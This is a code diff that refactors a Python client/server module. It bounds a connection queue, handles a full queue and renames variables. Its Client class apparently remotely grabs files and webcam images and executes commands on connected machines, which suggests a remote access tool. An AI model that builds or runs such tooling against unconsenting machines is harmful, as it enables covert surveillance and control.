@@ -9,7 +9,7 @@ import threading
 import traceback
 from datetime import datetime
 from typing import Tuple, Union
-from queue import Empty, Queue
+from queue import Empty, Queue, Full
 
 from cryptography.fernet import Fernet
 
@@ -273,8 +273,8 @@ class Client():
         if data == b'ERROR':
             self.send(b'RECEIVING')
             return False, self.receive()
-        with open(save_as, 'wb') as f:
-            f.write(data)
+        with open(save_as, 'wb') as _file:
+            _file.write(data)
         return True, save_as
 
     def webcam(self, save_as: str = None) -> Tuple[bool, Union[str, None]]:
@@ -286,8 +286,8 @@ class Client():
         data = self.receive()
         if data == b'ERROR':
             return False, None
-        with open(save_as, 'wb') as f:
-            f.write(data)
+        with open(save_as, 'wb') as _file:
+            _file.write(data)
         return True, save_as
 
     def exec(self, command: str) -> Tuple[str, Union[str, None]]:
@@ -401,7 +401,7 @@ class Server():
         self.socket = None
         self.thread = None
         self.event = threading.Event()
-        self.queue = Queue()
+        self.queue = Queue(maxsize=10)
         self.fernet = Fernet(key)
         self.clients = []
 
@@ -417,12 +417,14 @@ class Server():
 
                 client = Client(conn, address, self.fernet)
                 self.clients.append(client)
-                self.queue.put(client)
+                try:
+                    self.queue.put(client, block=False)
+                except Full:
+                    logging.info('Queue is full')
             except Exception as error:
                 logging.debug(errors(error))
-        self.event.clear()
 
-    def start(self, _print: bool = False) -> None:
+    def start(self) -> None:
         """ Start the Server """
 
         self.socket = socket.socket()
@@ -431,6 +433,8 @@ class Server():
         self.socket.bind((self.host, self.port))
         self.socket.listen(5)
 
+        self.event.clear()
+
         self.thread = threading.Thread(target=self._accept)
         self.thread.daemon = True
         self.thread.start()
@@ -438,7 +442,7 @@ class Server():
     def stop(self) -> None:
         """ Stop the server """
 
-        if self.thread.is_alive():
+        if not self.event.is_set():
             self.event.set()
         self.socket.shutdown(socket.SHUT_RDWR)
 
